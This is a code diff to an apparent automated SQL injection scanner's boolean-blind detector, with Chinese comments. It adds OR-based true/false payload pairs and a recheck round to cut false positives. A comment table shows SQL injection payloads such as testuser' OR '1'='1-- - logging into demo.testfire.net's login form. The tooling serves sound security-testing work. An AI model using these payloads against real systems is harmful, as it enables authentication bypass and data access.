@@ -112,22 +112,48 @@ export class BooleanBlindDetector extends Detector {
    * @param {string[]} templates 扁平 payload 模板数组（PAYLOADS[dbms].boolean），仅回退路径使用
    * @returns {Array<{ti:number, fi:number, truePayload?:string, falsePayload?:string, id?:string, isBoundary?:boolean}>}
    */
+  /**
+   * [D209] boundary 感知的布尔对：先 AND 后 OR。
+   *
+   * 为什么必须有 OR 这一对：`AND 1=1` 在「参数原值查不到任何行」的目标上**恒假**——
+   * `WHERE uid='ghost' AND 1=1` 仍是空集，真/假两组都落在同一页 ⇒ 无差异 ⇒ **静默漏报**。
+   * 实测 `demo.testfire.net` 的 `POST /doLogin`（`testuser` 不是有效用户）：
+   *
+   * | payload | 结果 |
+   * |---|---|
+   * | `testuser' AND '1'='1-- -` | login.jsp |
+   * | `testuser' AND '1'='2-- -` | login.jsp（**与上一条无差异**） |
+   * | `testuser' OR  '1'='1-- -` | `bank/main.jsp`（登录成功） |
+   * | `testuser' OR  '1'='2-- -` | login.jsp（**有差异**） |
+   *
+   * registry 里的 OR 条目救不了这个场景：它们是 `risk:2 / level:2`（默认 `--risk 1` 直接滤掉），
+   * 且模板 `{ORIG}' OR '1'='1` **不带注释后缀** ⇒ 后面还有 `AND passw=…` 时恒失效。
+   * 这里补的是「带注释的 OR」：`1=1` / `1=2` 与 AND 族一样不写数据，风险等同，故不受 risk 门槛限制。
+   * @param {object} ctx 探测上下文（用 point.boundary）
+   * @param {string} orig 参数原值
+   * @returns {Array<object>} 布尔对（AND 族在前，OR 族在后）
+   */
+  _boundaryPairs(ctx, orig) {
+    const b = ctx.point.boundary;
+    const pair = (op, id) => ({
+      ti: -1,
+      fi: -2,
+      truePayload: this.obfuscateValue(ctx, `${orig}${b} ${op} 1=1-- -`),
+      falsePayload: this.obfuscateValue(ctx, `${orig}${b} ${op} 1=2-- -`),
+      isBoundary: true,
+      ...(id ? { id } : {}),
+    });
+    return [pair('AND'), pair('OR', 'boundary-or')];
+  }
+
   _getBooleanPairs(ctx, templates) {
     const { point, config } = ctx;
     const orig = point.originalValue || '1';
     const risk = Number(config && config.risk) || 1;
     const pairs = [];
 
-    // boundary 感知对（两条路径共用）：探测到闭合前缀时优先尝试
-    if (point.boundary) {
-      pairs.push({
-        ti: -1,
-        fi: -2,
-        truePayload: this.obfuscateValue(ctx, `${orig}${point.boundary} AND 1=1-- -`),
-        falsePayload: this.obfuscateValue(ctx, `${orig}${point.boundary} AND 1=2-- -`),
-        isBoundary: true,
-      });
-    }
+    // boundary 感知对（两条路径共用）：探测到闭合前缀时优先尝试；先 AND 后 OR，见 _boundaryPairs
+    if (point.boundary) pairs.push(...this._boundaryPairs(ctx, orig));
 
     if (registryMode(config)) {
       // 注册表路径：按 level/risk/testFilter/testSkip 筛选声明式条目
@@ -575,16 +601,8 @@ export class BooleanBlindDetector extends Detector {
       for (let s = 0; s < effSamples; s++) {
         // P2-P8 CPU 比对下沉：状态码粗筛——真/假状态不同即视为有意义差异，跳过 body 精细比对
         // content-length 短路（T3）：头长度差异超容差同样跳过 body 全文 LCP/分块比对
-        const tRes = resps[s];
-        const fRes = resps[effSamples + s];
-        // [P0-FIX 2026-09-11] WAF 拦截页防线：任一采样对被拦截页污染 → 该采样不计入命中统计
-        // （waf-real echo 安全对照误报根因：WAF 对真/假 payload 拦截差异 ≠ SQL 执行差异）
-        if (this._pairPollutedByWafBlock(tRes?.resp, fRes?.resp)) continue;
-        if (
-          this._statusDiffer(tRes?.resp, fRes?.resp) ||
-          this._lengthDiffer(tRes?.resp, fRes?.resp) ||
-          meaningfulDiff(tBodies[s], fBodies[s])
-        ) meaningfulHits++;
+        // [D206] 判据收进 _pairHasMeaningfulDiff：主轮与命中复核轮必须同口径
+        if (this._pairHasMeaningfulDiff(resps[s], resps[effSamples + s], tBodies[s], fBodies[s], meaningfulDiff)) meaningfulHits++;
       }
       const meaningfulRatio = meaningfulHits / effSamples;
 
@@ -623,9 +641,18 @@ export class BooleanBlindDetector extends Detector {
         meaningfulRatio >= minRatio &&
         significant
       ) {
+        // [D206] 命中复核（跨轮一致性）：单轮判据在有状态/慢响应目标上会随采样窗口翻转
+        //（实测同一目标连跑三次 5/2/1 条，btnSubmit 的重现率 1/3）。这里再采一轮，
+        // 达不到 minRatio 就记进 trace.recheck 并跳过这一对 —— 宁可标「不稳」也不给假结论。
+        const re = await this._recheckPair(ctx, {
+          truePayload, falsePayload, effSamples, minRatio, similarToBaseline, meaningfulDiff, concurrency,
+        });
+        const lastTrace = tracePairs[tracePairs.length - 1];
+        if (lastTrace) lastTrace.recheck = re;
+        if (!re.ok) continue;
         result.vulnerable = true;
         result.dbms = dbms;
-        result.evidence = `布尔注入确认(统计${rb.adaptive ? '·自适应' : ''}): 真≈基线${trueRatio.toFixed(2)}、假≠基线${falseRatio.toFixed(2)}、差异${meaningfulRatio.toFixed(2)}、基线噪声${baselineNoiseRateVal.toFixed(2)}、门槛${minRatio.toFixed(2)}、z=${z === null ? 'NA' : z.toFixed(2)}(显著)`;
+        result.evidence = `布尔注入确认(统计${rb.adaptive ? '·自适应' : ''}): 真≈基线${trueRatio.toFixed(2)}、假≠基线${falseRatio.toFixed(2)}、差异${meaningfulRatio.toFixed(2)}、基线噪声${baselineNoiseRateVal.toFixed(2)}、门槛${minRatio.toFixed(2)}、z=${z === null ? 'NA' : z.toFixed(2)}(显著)；复核轮假≠基线${re.falseRatio.toFixed(2)}/差异${re.meaningfulRatio.toFixed(2)}`;
         result.payloads = [truePayload, falsePayload];
         point.confirmed = true;
         point.technique = 'boolean';
@@ -673,6 +700,65 @@ export class BooleanBlindDetector extends Detector {
   }
 
   // 从 sendConcurrent 的返回元素安全取响应体（并发失败降级空串，不影响一致率计算）
+  /**
+   * [D206] 单个采样对的「有意义差异」判据：WAF 拦截页污染不计；状态码/长度/正文任一不同即算。
+   * 主轮与复核轮**必须同口径**，所以收成一处（此前内联在主轮里，复核再写一遍必然漂）。
+   * @param {object} tRes 真条件响应（{resp}）
+   * @param {object} fRes 假条件响应（{resp}）
+   * @param {string} tBody 真条件剥离回显后的正文
+   * @param {string} fBody 假条件剥离回显后的正文
+   * @param {Function} meaningfulDiff 正文差异判据（主轮注入的闭包）
+   * @returns {boolean} 是否计入命中样本
+   */
+  _pairHasMeaningfulDiff(tRes, fRes, tBody, fBody, meaningfulDiff) {
+    if (this._pairPollutedByWafBlock(tRes?.resp, fRes?.resp)) return false;
+    return Boolean(
+      this._statusDiffer(tRes?.resp, fRes?.resp) ||
+      this._lengthDiffer(tRes?.resp, fRes?.resp) ||
+      meaningfulDiff(tBody, fBody),
+    );
+  }
+
+  /**
+   * [D206] 布尔命中复核：再采一轮，要求「假条件仍偏离基线」与「真假仍存在有意义差异」
+   * 都达到 minRatio 才算稳。
+   *
+   * 为什么必须有这一步：统计判据在**有状态/慢响应**目标上会随采样窗口翻转。实测
+   * `demo.testfire.net` 的 `POST /doLogin`（同一 URL、同一 body、同一 level）连跑三次，
+   * 检出 5 / 2 / 1 条；`btnSubmit`（常量提交按钮，值不参与 SQL）三次里只在一次被"确认"，
+   * 而它的 trace 里三对差异是 `[0, +103, -103]` —— 符号都不一致，是登录成功/失败页
+   * 在会话状态漂移下交替出现，不是 SQL 执行差异。
+   * 单轮 3 样本 + minRatio 0.66 只允许一个样本偏离，一次抖动就能翻盘；加轮次比加样本
+   * 更直接（同样请求量下，跨轮一致性对"偶发一次成立"的判别力更强）。
+   *
+   * 代价：仅在**判据通过后**多 2×effSamples 个请求（未命中路径零开销）。
+   * @param {object} ctx 探测上下文（httpClient/target/point）
+   * @param {{truePayload:string, falsePayload:string, effSamples:number, minRatio:number, similarToBaseline:Function, meaningfulDiff:Function, concurrency:number}} args 复核参数（与主轮同源）
+   * @returns {Promise<{ok:boolean, falseRatio:number, meaningfulRatio:number, samples:number}>} 复核结论
+   */
+  async _recheckPair(ctx, args) {
+    const { truePayload, falsePayload, effSamples, minRatio, similarToBaseline, meaningfulDiff, concurrency } = args;
+    const orig = ctx.point.originalValue || '1';
+    const reqs = [];
+    for (let s = 0; s < effSamples; s++) reqs.push(this.buildRequest(ctx.target, ctx.point, truePayload));
+    for (let s = 0; s < effSamples; s++) reqs.push(this.buildRequest(ctx.target, ctx.point, falsePayload));
+    const resps = await this.sendConcurrent(ctx.httpClient, ctx, reqs, {}, concurrency);
+    const tBodies = resps.slice(0, effSamples).map((r) => this._stripReflected(this._bodyOf(r), truePayload, orig));
+    const fBodies = resps.slice(effSamples).map((r) => this._stripReflected(this._bodyOf(r), falsePayload, orig));
+    const falseRatio = similarityRate(fBodies, similarToBaseline, false);
+    let hits = 0;
+    for (let s = 0; s < effSamples; s++) {
+      if (this._pairHasMeaningfulDiff(resps[s], resps[effSamples + s], tBodies[s], fBodies[s], meaningfulDiff)) hits++;
+    }
+    const meaningfulRatio = hits / effSamples;
+    return {
+      ok: falseRatio >= minRatio && meaningfulRatio >= minRatio,
+      falseRatio,
+      meaningfulRatio,
+      samples: effSamples,
+    };
+  }
+
   _bodyOf(r) {
     if (!r || r.__error || !r.resp) return '';
     return String(r.resp?.data ?? '');
